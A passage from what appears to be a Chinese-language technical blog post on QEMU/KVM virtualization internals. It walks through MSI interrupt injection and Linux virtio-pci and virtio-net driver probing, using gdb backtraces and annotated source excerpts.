os_host_main_loop_wait (timeout=0) at ../../qemu/util/main-loop.c:310</span></span><br><span class="line"><span class="comment">//#24 0x00005555560ce6d7 in main_loop_wait (nonblocking=0) at ../../qemu/util/main-loop.c:589</span></span><br><span class="line"><span class="comment">//#25 0x0000555555bd4e54 in qemu_main_loop () at ../../qemu/system/runstate.c:783</span></span><br><span class="line"><span class="comment">//#26 0x0000555555e96f5b in qemu_default_main () at ../../qemu/system/main.c:37</span></span><br><span class="line"><span class="comment">//#27 0x0000555555e96f9c in main (argc=39, argv=0x7fffffffdac8) at ../../qemu/system/main.c:48</span></span><br><span class="line"><span class="comment">//#28 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=39, argv=argv@entry=0x7fffffffdac8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#29 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=39, argv=0x7fffffffdac8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdab8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#30 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_msi_trigger</span><span class="params">(PCIDevice *dev, MSIMessage msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemTxAttrs attrs = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen uses the high bits of the address to contain some of the bits</span></span><br><span class="line"><span class="comment">     * of the PIRQ#. Therefore we can&#x27;t just send the write cycle and</span></span><br><span class="line"><span class="comment">     * trust that it&#x27;s caught by the APIC at 0xfee00000 because the</span></span><br><span class="line"><span class="comment">     * target of the write might be e.g. 0x0x1000fee46000 for PIRQ#4166.</span></span><br><span class="line"><span class="comment">     * So we intercept the delivery here instead of in kvm_send_msi().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (xen_mode == XEN_EMULATE &amp;&amp;</span><br><span class="line">        xen_evtchn_deliver_pirq_msi(msg.address, msg.data)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    attrs.requester_id = pci_requester_id(dev);</span><br><span class="line">    address_space_stl_le(&amp;dev-&gt;bus_master_as, msg.address, msg.data,</span><br><span class="line">                         attrs, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kvm_apic_mem_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                               <span class="type">uint64_t</span> data, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    MSIMessage msg = &#123; .address = addr, .data = data &#125;;</span><br><span class="line"></span><br><span class="line">    kvm_send_msi(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">kvm_send_msi</span><span class="params">(MSIMessage *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The message has already passed through interrupt remapping if enabled,</span></span><br><span class="line"><span class="comment">     * but the legacy extended destination ID in low bits still needs to be</span></span><br><span class="line"><span class="comment">     * handled.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    msg-&gt;address = kvm_swizzle_msi_ext_dest_id(msg-&gt;address);</span><br><span class="line"></span><br><span class="line">    ret = kvm_irqchip_send_msi(kvm_state, *msg);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kvm_irqchip_send_msi</span><span class="params">(KVMState *s, MSIMessage msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_msi</span> <span class="title">msi</span>;</span></span><br><span class="line"></span><br><span class="line">    msi.address_lo = (<span class="type">uint32_t</span>)msg.address;</span><br><span class="line">    msi.address_hi = msg.address &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    msi.data = le32_to_cpu(msg.data);</span><br><span class="line">    msi.flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msi.pad, <span class="number">0</span>, <span class="keyword">sizeof</span>(msi.pad));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> kvm_vm_ioctl(s, KVM_SIGNAL_MSI, &amp;msi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，最后其通过<strong>ioctl()</strong>，陷入<strong>kvm内核模块</strong>，让<strong>kvm内核模块</strong>根据cpu提供的中断注入接口向<strong>guest</strong>注入中断。</p><h1 id="virtio驱动"><a href="#virtio驱动" class="headerlink" title="virtio驱动"></a>virtio驱动</h1><p>这里主要介绍一下<strong>guest驱动</strong>设置virtio组件和数据处理的逻辑</p><h2 id="virtio设置-1"><a href="#virtio设置-1" class="headerlink" title="virtio设置"></a>virtio设置</h2><p><strong>guest驱动</strong>主要的任务是申请资源地址空间，并将对应的资源空间按照前面<a href="#virtio-transport">virtio transport</a>小节的协议传递给<strong>virtio设备</strong>，即通过读写<strong>PCI设置空间</strong>和<strong>virtio配置空间</strong>将资源gpa传递给<strong>virtio设备</strong></p><p>因为<strong>virtio-net-pci设备</strong>即包含<strong>virtio-pci</strong>的<strong>virtio transport</strong>，也包含<strong>virtio-net</strong>的<strong>virtio设备</strong>，因此其由<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/virtio/virtio_pci_common.c#L555"><strong>virtio_pci_probe()</strong></a>和<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/net/virtio_net.c#L4624"><strong>virtnet_probe()</strong></a>共同设置，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_pci_probe (pci_dev=0xffff888100941000, id=0xffffffff82299f00 &lt;virtio_pci_id_table&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/virtio/virtio_pci_common.c:557</span></span><br><span class="line"><span class="comment">//#1  0xffffffff816050a2 in local_pci_probe (_ddi=_ddi@entry=0xffffc90000013d40) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:324</span></span><br><span class="line"><span class="comment">//#2  0xffffffff81605fdd in pci_call_probe (id=&lt;optimized out&gt;, dev=0xffff888100941000, drv=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:392</span></span><br><span class="line"><span class="comment">//#3  __pci_device_probe (pci_dev=0xffff888100941000, drv=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:417</span></span><br><span class="line"><span class="comment">//#4  pci_device_probe (dev=0xffff8881009410c0) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/pci-driver.c:451</span></span><br><span class="line"><span class="comment">//#5  0xffffffff8193dd1c in call_driver_probe (drv=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;, dev=0xffff8881009410c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:578</span></span><br><span class="line"><span class="comment">//#6  really_probe (dev=dev@entry=0xffff8881009410c0, drv=drv@entry=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:656</span></span><br><span class="line"><span class="comment">//#7  0xffffffff8193df8e in __driver_probe_device (drv=drv@entry=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;, dev=dev@entry=0xffff8881009410c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:798</span></span><br><span class="line"><span class="comment">//#8  0xffffffff8193e069 in driver_probe_device (drv=drv@entry=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;, dev=dev@entry=0xffff8881009410c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:828</span></span><br><span class="line"><span class="comment">//#9  0xffffffff8193e2e5 in __driver_attach (data=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;, dev=0xffff8881009410c0) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1214</span></span><br><span class="line"><span class="comment">//#10 __driver_attach (dev=0xffff8881009410c0, data=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1154</span></span><br><span class="line"><span class="comment">//#11 0xffffffff8193bab7 in bus_for_each_dev (bus=&lt;optimized out&gt;, start=start@entry=0x0 &lt;fixed_percpu_data&gt;, data=data@entry=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;, fn=fn@entry=0xffffffff8193e260 &lt;__driver_attach&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:368</span></span><br><span class="line"><span class="comment">//#12 0xffffffff8193d6f9 in driver_attach (drv=drv@entry=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1231</span></span><br><span class="line"><span class="comment">//#13 0xffffffff8193ce97 in bus_add_driver (drv=drv@entry=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:673</span></span><br><span class="line"><span class="comment">//#14 0xffffffff8193f48b in driver_register (drv=0xffffffff82be1a88 &lt;virtio_pci_driver+104&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/driver.c:246</span></span><br><span class="line"><span class="comment">//#15 0xffffffff81001a63 in do_one_initcall (fn=0xffffffff832dfeb0 &lt;virtio_pci_driver_init&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1238</span></span><br><span class="line"><span class="comment">//#16 0xffffffff8328d1d7 in do_initcall_level (command_line=0xffff88810033a140 &quot;rdinit&quot;, level=6) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1300</span></span><br><span class="line"><span class="comment">//#17 do_initcalls () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1316</span></span><br><span class="line"><span class="comment">//#18 do_basic_setup () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1335</span></span><br><span class="line"><span class="comment">//#19 kernel_init_freeable () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1548</span></span><br><span class="line"><span class="comment">//#20 0xffffffff81f657a5 in kernel_init (unused=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1437</span></span><br><span class="line"><span class="comment">//#21 0xffffffff810baddf in ret_from_fork (prev=&lt;optimized out&gt;, regs=0xffffc90000013f58, fn=0xffffffff81f65790 &lt;kernel_init&gt;, fn_arg=0x0 &lt;fixed_percpu_data&gt;) at /home/hawk/Desktop/mqemu/kernel/arch/x86/kernel/process.c:147</span></span><br><span class="line"><span class="comment">//#22 0xffffffff8100244a in ret_from_fork_asm () at /home/hawk/Desktop/mqemu/kernel/arch/x86/entry/entry_64.S:243</span></span><br><span class="line"><span class="comment">//#23 0x0000000000000000 in ?? ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtio_pci_probe</span><span class="params">(<span class="keyword">struct</span> pci_dev *pci_dev,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="keyword">struct</span> pci_device_id *id)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">rc = virtio_pci_modern_probe(vp_dev);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">virtio_pci_modern_probe</span><span class="params">(<span class="keyword">struct</span> virtio_pci_device *vp_dev)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">err = vp_modern_probe(mdev);</span><br><span class="line">    ...</span><br><span class="line">vp_dev-&gt;vdev.config = &amp;virtio_pci_config_ops;</span><br><span class="line">vp_dev-&gt;config_vector = vp_config_vector;</span><br><span class="line">vp_dev-&gt;setup_vq = setup_vq;</span><br><span class="line">vp_dev-&gt;del_vq = del_vq;</span><br><span class="line">vp_dev-&gt;is_avq = vp_is_avq;</span><br><span class="line">vp_dev-&gt;isr = mdev-&gt;isr;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vp_modern_probe</span><span class="params">(<span class="keyword">struct</span> virtio_pci_modern_device *mdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* check for a common config: if not, use legacy mode (bar 0). */</span></span><br><span class="line">common = virtio_pci_find_capability(pci_dev, VIRTIO_PCI_CAP_COMMON_CFG,</span><br><span class="line">    IORESOURCE_IO | IORESOURCE_MEM,</span><br><span class="line">    &amp;mdev-&gt;modern_bars);</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* If common is there, these should be too... */</span></span><br><span class="line">isr = virtio_pci_find_capability(pci_dev, VIRTIO_PCI_CAP_ISR_CFG,</span><br><span class="line"> IORESOURCE_IO | IORESOURCE_MEM,</span><br><span class="line"> &amp;mdev-&gt;modern_bars);</span><br><span class="line">notify = virtio_pci_find_capability(pci_dev, VIRTIO_PCI_CAP_NOTIFY_CFG,</span><br><span class="line">    IORESOURCE_IO | IORESOURCE_MEM,</span><br><span class="line">    &amp;mdev-&gt;modern_bars);</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* Device capability is only mandatory for devices that have</span></span><br><span class="line"><span class="comment"> * device-specific configuration.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">device = virtio_pci_find_capability(pci_dev, VIRTIO_PCI_CAP_DEVICE_CFG,</span><br><span class="line">    IORESOURCE_IO | IORESOURCE_MEM,</span><br><span class="line">    &amp;mdev-&gt;modern_bars);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">mdev-&gt;common = vp_modern_map_capability(mdev, common,</span><br><span class="line">      <span class="keyword">sizeof</span>(<span class="keyword">struct</span> virtio_pci_common_cfg), <span class="number">4</span>, <span class="number">0</span>,</span><br><span class="line">      offsetofend(<span class="keyword">struct</span> virtio_pci_modern_common_cfg,</span><br><span class="line">  admin_queue_num),</span><br><span class="line">      &amp;mdev-&gt;common_len, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">mdev-&gt;isr = vp_modern_map_capability(mdev, isr, <span class="keyword">sizeof</span>(u8), <span class="number">1</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">     <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read notify_off_multiplier from config space. */</span></span><br><span class="line">pci_read_config_dword(pci_dev,</span><br><span class="line">      notify + offsetof(<span class="keyword">struct</span> virtio_pci_notify_cap,</span><br><span class="line">notify_off_multiplier),</span><br><span class="line">      &amp;mdev-&gt;notify_offset_multiplier);</span><br><span class="line"><span class="comment">/* Read notify length and offset from config space. */</span></span><br><span class="line">pci_read_config_dword(pci_dev,</span><br><span class="line">      notify + offsetof(<span class="keyword">struct</span> virtio_pci_notify_cap,</span><br><span class="line">cap.length),</span><br><span class="line">      &amp;notify_length);</span><br><span class="line"></span><br><span class="line">pci_read_config_dword(pci_dev,</span><br><span class="line">      notify + offsetof(<span class="keyword">struct</span> virtio_pci_notify_cap,</span><br><span class="line">cap.offset),</span><br><span class="line">      &amp;notify_offset);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* We don&#x27;t know how many VQs we&#x27;ll map, ahead of the time.</span></span><br><span class="line"><span class="comment"> * If notify length is small, map it all now.</span></span><br><span class="line"><span class="comment"> * Otherwise, map each VQ individually later.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((u64)notify_length + (notify_offset % PAGE_SIZE) &lt;= PAGE_SIZE) &#123;</span><br><span class="line">mdev-&gt;notify_base = vp_modern_map_capability(mdev, notify,</span><br><span class="line">     <span class="number">2</span>, <span class="number">2</span>,</span><br><span class="line">     <span class="number">0</span>, notify_length,</span><br><span class="line">     &amp;mdev-&gt;notify_len,</span><br><span class="line">     &amp;mdev-&gt;notify_pa);</span><br><span class="line"><span class="keyword">if</span> (!mdev-&gt;notify_base)</span><br><span class="line"><span class="keyword">goto</span> err_map_notify;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mdev-&gt;notify_map_cap = notify;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Again, we don&#x27;t know how much we should map, but PAGE_SIZE</span></span><br><span class="line"><span class="comment"> * is more than enough for all existing devices.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (device) &#123;</span><br><span class="line">mdev-&gt;device = vp_modern_map_capability(mdev, device, <span class="number">0</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">0</span>, PAGE_SIZE,</span><br><span class="line">&amp;mdev-&gt;device_len,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!mdev-&gt;device)</span><br><span class="line"><span class="keyword">goto</span> err_map_device;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据<a href="/2024/08/04/qemu%E7%9A%84PCI%E8%AE%BE%E5%A4%87/" title="qemu的PCI设备">qemu的PCI设备</a>可知，<strong>acpi(Advanced Configuration and Power Interface)</strong>驱动会将<strong>PCI配置空间</strong>设置好，接着这里的<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/virtio/virtio_pci_modern_dev.c#L223"><strong>vp_modern_probe()</strong></a>会解析<strong>PCI配置空间</strong>(capability)并解析各个<strong>virtio配置空间</strong>。但此时未进行设置，仅仅注册了<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/virtio/virtio_pci_modern.c#L800"><strong>virtio_pci_config_ops</strong></a>、<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/virtio/virtio_pci_modern.c#L530"><strong>setup_vq()</strong></a>和<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/virtio/virtio_pci_modern.c#L516"><strong>vp_config_vector()</strong></a>的函数指针，等后续<a href="https://elixir.bootlin.com/linux/v6.9-rc2/source/drivers/net/virtio_net.c#L4624"><strong>virtnet_probe()</strong></a>继续设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtnet_probe (vdev=0xffff888100953000) at /home/hawk/Desktop/mqemu/kernel/drivers/net/virtio_net.c:4625</span></span><br><span class="line"><span class="comment">//#1  0xffffffff81692f5e in virtio_dev_probe (_d=0xffff888100953010) at /home/hawk/Desktop/mqemu/kernel/drivers/virtio/virtio.c:311</span></span><br><span class="line"><span class="comment">//#2  0xffffffff8193dd1c in call_driver_probe (drv=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;, dev=0xffff888100953010) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:578</span></span><br><span class="line"><span class="comment">//#3  really_probe (dev=dev@entry=0xffff888100953010, drv=drv@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:656</span></span><br><span class="line"><span class="comment">//#4  0xffffffff8193df8e in __driver_probe_device (drv=drv@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;, dev=dev@entry=0xffff888100953010) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:798</span></span><br><span class="line"><span class="comment">//#5  0xffffffff8193e069 in driver_probe_device (drv=drv@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;, dev=dev@entry=0xffff888100953010) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:828</span></span><br><span class="line"><span class="comment">//#6  0xffffffff8193e2e5 in __driver_attach (data=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;, dev=0xffff888100953010) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1214</span></span><br><span class="line"><span class="comment">//#7  __driver_attach (dev=0xffff888100953010, data=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1154</span></span><br><span class="line"><span class="comment">//#8  0xffffffff8193bab7 in bus_for_each_dev (bus=&lt;optimized out&gt;, start=start@entry=0x0 &lt;fixed_percpu_data&gt;, data=data@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;, fn=fn@entry=0xffffffff8193e260 &lt;__driver_attach&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:368</span></span><br><span class="line"><span class="comment">//#9  0xffffffff8193d6f9 in driver_attach (drv=drv@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/dd.c:1231</span></span><br><span class="line"><span class="comment">//#10 0xffffffff8193ce97 in bus_add_driver (drv=drv@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/bus.c:673</span></span><br><span class="line"><span class="comment">//#11 0xffffffff8193f48b in driver_register (drv=drv@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/driver.c:246</span></span><br><span class="line"><span class="comment">//#12 0xffffffff816926bb in register_virtio_driver (driver=driver@entry=0xffffffff82c0ffa0 &lt;virtio_net_driver&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/virtio/virtio.c:370</span></span><br><span class="line"><span class="comment">//#13 